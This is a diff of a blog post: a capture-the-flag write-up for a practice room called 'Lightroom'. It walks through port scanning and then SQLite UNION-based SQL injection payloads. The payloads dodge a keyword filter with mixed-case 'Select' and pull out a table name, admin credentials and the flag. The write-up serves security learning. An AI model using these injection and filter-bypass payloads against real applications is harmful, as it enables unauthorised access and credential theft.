@@ -1,7 +1,7 @@
 ---
 title: "Lightroom"
 date: 2025-01-18T09:36:24+01:00
-draft: true
+draft: false
 hidden: false
 tags:
     - ctf
@@ -12,7 +12,7 @@ summary: ""
 
 |Revised Date | Author | Comment |
 | ----------- | ------ | ------- |
-| 18.01.2025  | Roger Johnsen | Article added |
+| 19.01.2025  | Roger Johnsen | Article added |
 
 ## Introduction
 
@@ -24,13 +24,7 @@ You can use the username smokey in order to get started._
 
 --- 
 
-## Solution
-
-### Reconnaissance
-
-| ID | Technique | Comment |
-| --- | ---------------------- | ------- | 
-| T1595.001 | Active Scanning: Scanning IP Blocks | | |
+## Portscanning
 
 ```bash
 nmap -sS -Pn -p- 10.10.199.201 -oN scan.txt
@@ -44,18 +38,7 @@ PORT     STATE SERVICE
 1337/tcp open  waste
 ```
 
-### Resource Development
-
-| ID | Technique | Comment |
-| --- | ---------------------- | ------- | 
-| | | |
-
-### Initial Access
-
-| ID | Technique | Comment |
-| --- | ---------------------- | ------- | 
-| T1190 | Exploit Public-Facing Application | | |
-
+## Enumerating service
 
 ```bash
 nc 10.10.199.201 1337
@@ -68,13 +51,12 @@ Error: unrecognized token: "''' LIMIT 30"
 Please enter your username: --
 For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
 ```
+Initial prodding of the login prompt reveals the following:  
 
-Initial prodding of the login prompt reveals that 
-
-- If username exists, it returns and displays the associated password
-- The prompt hints at database, hence and thus, it's most likely SQL injection at hand here
-- Inserting a single quotation mark, ```'```, returns an SQL error
-- Input filtering is in place. 
+- If a username exists, the system returns and displays the associated password.  
+- The prompt suggests a database is involved, making SQL injection the most likely vulnerability.  
+- Inserting a single quotation mark (`'`) results in an SQL error.  
+- Input filtering appears to be in place.  
 
 ```bash
 nc 10.10.199.201 1337
@@ -97,87 +79,105 @@ Further prodding using the following payloads:
 | ```' or username like 'a%``` | Returns the same password as above mentioned "OR" statement |
 | ```' or username like 'x%``` | No user founds. Verification that I have guessed the correct column and that there are no users starting with "x" | 
 
+#### The hints
 
+The room's description states, *"I am working on a database application called Light."* The room itself is named *"Light,"* and the URL for the room is *"/lightroom."* Seeing these in combination, it seems likely that we are dealing with SQLite - phonetically, it makes sense. Therefore, I will base my investigation on this assumption moving forward.  
 
-#### Enumerated users
+## Enumerating database
 
-| Username | Password |
-| -------- | -------- |
-| alice | tF8tj2o94WE4LKC |
-| hazel | EcSuU35WlVipjXG |
-| ralph | YO1U9O1m52aJImA | 
-| smokey | vYQ5ngPpw8AdUmL |
-| steve | WObjufHX1foR8d7 |
-| michael | 7DV4dwA0g5FacRe |
-| john | e74tqwRh2oApPo6 |
-| rob | yAn4fPaF2qpCKpR |
+### Tables
 
-{{% notice style="note" title="There may be pirates" icon="info" %}}
-It is all about the boxes.
-{{% /notice %}}
+For standard querying, listing tables in SQLite can be accomplished with the following query, which we will exploit shortly:
 
-### Execution
+```sql
+SELECT name FROM sqlite_master WHERE type = 'table' ORDER BY name;
+```
 
-| MITRE ATT&CK Technique | Comment |
-| ---------------------- | ------- |
-| | | 
+When applied to the application's input, we get something like this:
 
-### Persistence
+```sql
+x' Union SELECT name FROM sqlite_master WHERE type='table
+```
 
-| MITRE ATT&CK Technique | Comment |
-| ---------------------- | ------- |
-| | | 
+Putting this into practice:
 
-### Privilege Escalation
+```bash
+nc 10.10.147.110 1337
 
-| MITRE ATT&CK Technique | Comment |
-| ---------------------- | ------- |
-| | | 
+Welcome to the Light database!
+Please enter your username: x' UNION SELECT name FROM sqlite_master WHERE type='table
+Ahh there is a word in there I don't like :(
+Please enter your username: 
+```
 
-### Defense Evasion
+While debugging, it seems the backend does not accept the "SELECT" keyword, even in lowercase. However, this works:  
 
-| MITRE ATT&CK Technique | Comment |
-| ---------------------- | ------- |
-| | | 
+```bash
+nc 10.10.147.110 1337
 
-### Credential Access
+Welcome to the Light database!
+Please enter your username: x' Union Select name FROM sqlite_master WHERE type='table
+Password: admintable
+Please enter your username: 
+```
 
-| MITRE ATT&CK Technique | Comment |
-| ---------------------- | ------- |
-| | | 
+### Users
 
-### Discovery
+We now know the table name, "admintable." Let's see if we can retrieve its contents! We'll use the same logic as above:
 
-| MITRE ATT&CK Technique | Comment |
-| ---------------------- | ------- |
-| | | 
+```sql
+x' Union Select username FROM admintable WHERE username like '%
+```
 
-### Lateral Movement
+Putting this into practice:
 
-| MITRE ATT&CK Technique | Comment |
-| ---------------------- | ------- |
-| | | 
+```bash
+nc 10.10.147.110 1337
 
-### Collection
+Welcome to the Light database!
+Please enter your username: x' Union Select username FROM admintable WHERE username like '%
+Password: T*************
+Please enter your username: T*************
+Username not found.
+Please enter your username:
+```
 
-| MITRE ATT&CK Technique | Comment |
-| ---------------------- | ------- |
-| | | 
+Although we can extract the username, we cannot retrieve the password by simply entering the username at the prompt. However, we must use SQL injection once again:
 
-### Command and Control
+```sql
+```sql
+x' Union Select password FROM admintable WHERE username like 'T%
+```
 
-| MITRE ATT&CK Technique | Comment |
-| ---------------------- | ------- |
-| | | 
+Putting this into practice:
 
-### Exfiltration
+```bash
+nc 10.10.147.110 1337
 
-| MITRE ATT&CK Technique | Comment |
-| ---------------------- | ------- |
-| | | 
+Welcome to the Light database!
+Please enter your username: x' Union Select password FROM admintable WHERE username like 'T%
+Password: m*******************
+Please enter your username: 
+```
 
-### Impact
+At this point, I thought I could simply SSH into the machine and retrieve the flag. Unfortunately, the credentials didn’t work. So, I decided to revisit probing the database.
 
-| MITRE ATT&CK Technique | Comment |
-| ---------------------- | ------- |
-| | | 
+### Flag
+
+It appears that there is only one table in the database. Perhaps there is more content I'm not aware of? I’m trying this route without looking at the username I recently found:
+
+```sql
+x' Union Select password FROM admintable WHERE username not like 'T%
+```
+
+Putting this into practice:
+
+```bash
+nc 10.10.147.110 1337         
+Welcome to the Light database!
+Please enter your username: x' Union Select password FROM admintable WHERE username not like 'T%
+Password: THM{******************************}
+Please enter your username:
+```
+
+And there’s the flag.
